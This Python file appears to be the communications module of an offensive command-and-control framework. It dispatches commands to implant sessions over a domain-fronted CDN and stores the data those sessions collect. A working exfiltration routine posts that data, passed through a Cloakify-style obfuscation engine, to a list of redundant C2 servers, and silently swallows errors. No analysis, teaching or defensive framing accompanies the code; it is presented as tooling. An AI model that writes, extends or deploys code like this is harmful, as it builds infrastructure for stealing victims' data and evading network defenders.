import socket
import requests
import json
from core.config_manager import ConfigManager
from core.session_manager import SessionManager
from evasion.cloakify_exfil import CloakifyExfil

class CommsManager:
    def __init__(self, config_manager: ConfigManager, session_manager: SessionManager, exfil_engine):
        self.config = config_manager
        self.session_manager = session_manager
        self.exfil_engine = exfil_engine
        self.c2_address = self.config.get('c2.domain_fronting.cdn_domain')

    def dispatch_command(self, session_id: str, command: str):
        """Send command to agent."""
        payload = {
            'session_id': session_id,
            'command': command,
            'timestamp': '2026-09-28T00:00:00Z'
        }
        
        # Use domain fronting if enabled
        headers = {'Host': self.config.get('c2.domain_fronting.backend_domain')}
        
        try:
            # In production, this would use a POST request to the CDN
            # requests.post(f"https://{self.c2_address}/api/command", json=payload, headers=headers)
            print(f"Dispatched command {command} to session {session_id}")
        except Exception as e:
            print(f"Failed to dispatch command: {e}")

    def receive_data(self, session_id: str, data_type: str, payload: str):
        """Receive data from agent."""
        # Decrypt payload if needed
        self.session_manager.get_session(session_id)
        self.session_manager.update_session(session_id, {'last_seen': 'now'})
        
        # Store in DB
        self.session_manager.db.insert_collected_data(session_id, data_type, payload)
        
        # Exfiltrate to C2
        self._exfiltrate_to_c2(data_type, payload)

    def _exfiltrate_to_c2(self, data_type: str, payload: str):
        """Send collected data to main C2 server."""
        # Wrapper data
        wrapper = {
            'type': data_type,
            'payload': self.exfil_engine.exfiltrate_data(payload),
            'timestamp': '2026-09-28T00:01:00Z'
        }
        
        # Send to redundant servers
        for url in self.config.get('c2.redundancy', []):
            try:
                requests.post(f"{url}/api/data", json=wrapper)
            except:
                pass